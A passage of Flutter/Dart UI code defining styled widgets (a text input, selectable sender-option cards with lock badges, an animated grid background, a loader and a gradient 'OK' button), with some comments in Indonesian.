          padding: const EdgeInsets.symmetric(vertical: 12),
          decoration: BoxDecoration(
            gradient: active
                ? const LinearGradient(
                    colors: [Color(0xFF3F3F3F), Color(0xFF0A0A0A)],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  )
                : null,
            color: active ? null : Colors.transparent,
            borderRadius: BorderRadius.circular(12),
            border: active
                ? Border.all(color: Colors.white, width: 1.5)
                : null,
            boxShadow: active
                ? [
                    BoxShadow(
                        color: Colors.black.withOpacity(0.35),
                        blurRadius: 10,
                        offset: const Offset(0, 4)),
                    BoxShadow(
                        color: Colors.white.withOpacity(0.4),
                        blurRadius: 2,
                        offset: const Offset(-1, -1)),
                  ]
                : [],
          ),
          child: Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(icon, size: 15,
                  color: active ? Colors.white : _C.textDim),
              const SizedBox(width: 7),
              Text(label,
                  style: TextStyle(
                    color: active ? Colors.white : _C.textDim,
                    fontSize: 13,
                    fontWeight: active ? FontWeight.w700 : FontWeight.w400,
                  )),
            ],
          ),
        ),
      ),
    );
  }
}

class _InputSection extends StatelessWidget {
  final IconData icon;
  final String label;
  final Widget child;

  const _InputSection({
    required this.icon, required this.label, required this.child,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(18),
        border: Border.all(color: Colors.white, width: 1.5),
        boxShadow: _C.shadow3d(depth: 5, opacity: 0.18),
      ),
      child: Column(crossAxisAlignment: CrossAxisAlignment.stretch, children: [
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
          decoration: BoxDecoration(
            border: Border(bottom: BorderSide(color: _C.border.withOpacity(0.6))),
          ),
          child: Row(children: [
            Icon(icon, color: _C.textSub, size: 14),
            const SizedBox(width: 8),
            Text(label, style: const TextStyle(color: _C.textSub,
                fontSize: 11, fontWeight: FontWeight.w600)),
          ]),
        ),
        Padding(padding: const EdgeInsets.all(12), child: child),
      ]),
    );
  }
}

class _BugInput extends StatefulWidget {
  final TextEditingController controller;
  final String hint;
  final TextInputType keyboardType;
  final IconData icon;

  const _BugInput({
    required this.controller, required this.hint,
    required this.keyboardType, required this.icon,
  });

  @override
  State<_BugInput> createState() => _BugInputState();
}

class _BugInputState extends State<_BugInput> {
  bool _focused = false;
  final _focus  = FocusNode();

  @override
  void initState() {
    super.initState();
    _focus.addListener(() => setState(() => _focused = _focus.hasFocus));
  }

  @override
  void dispose() { _focus.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return AnimatedContainer(
      duration: const Duration(milliseconds: 190),
      decoration: BoxDecoration(
        color: _C.surface,
        borderRadius: BorderRadius.circular(13),
        border: Border.all(
          color: _focused ? _C.black : _C.border,
          width: _focused ? 1.8 : 1.0,
        ),
        boxShadow: _focused
            ? [
                BoxShadow(
                    color: Colors.black.withOpacity(0.2),
                    blurRadius: 8,
                    offset: const Offset(0, 3)),
                BoxShadow(
                    color: Colors.white.withOpacity(0.8),
                    blurRadius: 3,
                    offset: const Offset(-1, -2)),
              ]
            : [
                BoxShadow(
                    color: Colors.black.withOpacity(0.08),
                    blurRadius: 5,
                    offset: const Offset(0, 2)),
              ],
      ),
      child: TextField(
        controller: widget.controller,
        focusNode: _focus,
        keyboardType: widget.keyboardType,
        style: const TextStyle(color: _C.text, fontSize: 14,
            fontWeight: FontWeight.w500),
        cursorColor: _C.black,
        decoration: InputDecoration(
          hintText: widget.hint,
          hintStyle: const TextStyle(color: _C.textDim, fontSize: 13),
          prefixIcon: Icon(widget.icon,
              color: _focused ? _C.black : _C.textSub, size: 17),
          border: InputBorder.none,
          contentPadding: const EdgeInsets.symmetric(
              horizontal: 16, vertical: 15),
        ),
      ),
    );
  }
}

class _SenderOption extends StatefulWidget {
  final IconData icon;
  final String label;
  final String sublabel;
  final bool selected;
  final bool locked;
  final VoidCallback onTap;

  const _SenderOption({
    required this.icon, required this.label, required this.sublabel,
    required this.selected, required this.locked, required this.onTap,
  });

  @override
  State<_SenderOption> createState() => _SenderOptionState();
}

class _SenderOptionState extends State<_SenderOption> {
  bool _pressed = false;

  @override
  Widget build(BuildContext context) {
    final color = widget.selected ? Colors.white : _C.textSub;
    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) { setState(() => _pressed = false); widget.onTap(); },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedScale(
        scale: _pressed ? 0.95 : 1.0,
        duration: const Duration(milliseconds: 110),
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 190),
          padding: const EdgeInsets.symmetric(vertical: 14, horizontal: 12),
          decoration: BoxDecoration(
            gradient: widget.selected
                ? const LinearGradient(
                    colors: [Color(0xFF3F3F3F), Color(0xFF0A0A0A)],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  )
                : const LinearGradient(
                    colors: [Color(0xFFFFFFFF), Color(0xFFF0F0F0)],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
            borderRadius: BorderRadius.circular(14),
            border: Border.all(
              color: Colors.white,
              width: 1.5,
            ),
            boxShadow: widget.selected
                ? [
                    BoxShadow(
                        color: Colors.black.withOpacity(0.4),
                        blurRadius: 12,
                        offset: const Offset(0, 5)),
                    BoxShadow(
                        color: Colors.white.withOpacity(0.5),
                        blurRadius: 3,
                        offset: const Offset(-1, -2)),
                  ]
                : _C.shadow3d(depth: 4, opacity: 0.15),
          ),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Stack(clipBehavior: Clip.none, children: [
              Icon(widget.icon, color: widget.selected ? Colors.white : _C.text, size: 19),
              if (widget.locked)
                Positioned(
                  right: -4, top: -4,
                  child: Container(
                    width: 12, height: 12,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      color: _C.amber,
                      border: Border.all(color: _C.card, width: 1.5),
                    ),
                    child: const Icon(Icons.lock_rounded,
                        color: Colors.white, size: 7),
                  ),
                ),
            ]),
            const SizedBox(height: 8),
            Text(widget.label, style: TextStyle(color: color,
                fontSize: 13, fontWeight: FontWeight.w700)),
            const SizedBox(height: 3),
            Text(widget.sublabel,
                textAlign: TextAlign.center,
                style: TextStyle(
                  color: widget.selected
                      ? Colors.white.withOpacity(0.7)
                      : _C.textDim,
                  fontSize: 10, height: 1.3)),
            if (widget.selected) ...[
              const SizedBox(height: 6),
              Container(width: 18, height: 2.5,
                  decoration: BoxDecoration(
                    color: Colors.white,
                    borderRadius: BorderRadius.circular(2),
                    boxShadow: [
                      BoxShadow(color: Colors.white.withOpacity(0.7), blurRadius: 4),
                    ],
                  )),
            ],
          ]),
        ),
      ),
    );
  }
}

// ─── Background & Primitives ──────────────────────────────────────────────────
class _WavePainter extends CustomPainter {
  final double t;
  _WavePainter(this.t);

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = Colors.white.withOpacity(0.08)
      ..style = PaintingStyle.fill;
    final path = Path();
    path.moveTo(0, size.height);
    for (double x = 0; x <= size.width; x++) {
      final y = size.height * 0.5 +
          math.sin((x / size.width * 4 * math.pi) + (t * math.pi * 2)) *
              size.height * 0.14;
      path.lineTo(x, y);
    }
    path.lineTo(size.width, size.height);
    path.close();
    canvas.drawPath(path, paint);
  }

  @override
  bool shouldRepaint(_WavePainter old) => old.t != t;
}

class _DotsLoader extends StatefulWidget {
  const _DotsLoader();

  @override
  State<_DotsLoader> createState() => _DotsLoaderState();
}

class _DotsLoaderState extends State<_DotsLoader>
    with SingleTickerProviderStateMixin {
  late AnimationController _c;

  @override
  void initState() {
    super.initState();
    _c = AnimationController(vsync: this,
        duration: const Duration(milliseconds: 900))..repeat();
  }

  @override
  void dispose() { _c.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: _c,
      builder: (_, __) => Row(
        mainAxisSize: MainAxisSize.min,
        children: List.generate(3, (i) {
          final t = ((_c.value - i / 3) % 1.0).clamp(0.0, 1.0);
          final s = math.sin(t * math.pi);
          return Padding(
            padding: const EdgeInsets.symmetric(horizontal: 4),
            child: Transform.scale(
              scale: 0.4 + s * 0.6,
              child: Container(
                width: 7, height: 7,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: Colors.black.withOpacity(0.3 + s * 0.6),
                ),
              ),
            ),
          );
        }),
      ),
    );
  }
}

class _AnimatedBg extends StatelessWidget {
  final AnimationController controller;
  const _AnimatedBg({required this.controller});

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: controller,
      builder: (_, __) => CustomPaint(painter: _BgPainter(controller.value)),
    );
  }
}

class _BgPainter extends CustomPainter {
  final double t;
  _BgPainter(this.t);

  @override
  void paint(Canvas canvas, Size size) {
    // Background grayscale gradient
    canvas.drawRect(
      Rect.fromLTWH(0, 0, size.width, size.height),
      Paint()
        ..shader = const LinearGradient(
          begin: Alignment.topCenter,
          end: Alignment.bottomCenter,
          colors: [Color(0xFFF5F5F5), Color(0xFFE0E0E0)],
        ).createShader(Rect.fromLTWH(0, 0, size.width, size.height)),
    );

    // Grid monokrom
    final grid = Paint()
      ..color = Colors.black.withOpacity(0.06)
      ..strokeWidth = 0.4;
    const step = 40.0;
    for (double x = 0; x < size.width; x += step) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), grid);
    }
    for (double y = 0; y < size.height; y += step) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), grid);
    }

    // Glow putih di atas
    final glow = Paint()
      ..shader = RadialGradient(colors: [
        Colors.white.withOpacity(0.5 + math.sin(t * math.pi * 2) * 0.1),
        Colors.transparent,
      ], radius: 0.85).createShader(
          Rect.fromCircle(
              center: Offset(size.width / 2, 0), radius: size.width));
    canvas.drawCircle(Offset(size.width / 2, 0), size.width, glow);
  }

  @override
  bool shouldRepaint(_BgPainter old) => old.t != t;
}

class _GradBtn extends StatefulWidget {
  final String label;
  final VoidCallback onTap;
  final bool fullWidth;

  const _GradBtn({
    required this.label, required this.onTap, this.fullWidth = false,
  });

  @override
  State<_GradBtn> createState() => _GradBtnState();
}

class _GradBtnState extends State<_GradBtn> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _down = true),
      onTapUp: (_) { setState(() => _down = false); widget.onTap(); },
      onTapCancel: () => setState(() => _down = false),
      child: AnimatedScale(
        scale: _down ? 0.96 : 1.0,
        duration: const Duration(milliseconds: 110),
        child: Container(
          height: 46,
          width: widget.fullWidth ? double.infinity : null,
          padding: widget.fullWidth
              ? EdgeInsets.zero
              : const EdgeInsets.symmetric(horizontal: 28),
          decoration: BoxDecoration(
            gradient: const LinearGradient(
              colors: [Color(0xFF3F3F3F), Color(0xFF0A0A0A)],
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
            ),
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: Colors.white, width: 1.5),
            boxShadow: _down
                ? []
                : [
                    BoxShadow(
                        color: Colors.black.withOpacity(0.35),
                        blurRadius: 12,
                        offset: const Offset(0, 5)),
                    BoxShadow(
                        color: Colors.white.withOpacity(0.5),
                        blurRadius: 3,
                        offset: const Offset(-1, -2)),
                  ],
          ),
          child: const Center(
            child: Text('OK',
                style: TextStyle(color: Colors.white,
                    fontWeight: FontWeight.w700, fontSize: 14,
                    letterSpacing: 1)),
          ),
        ),
      ),
    );
  }
}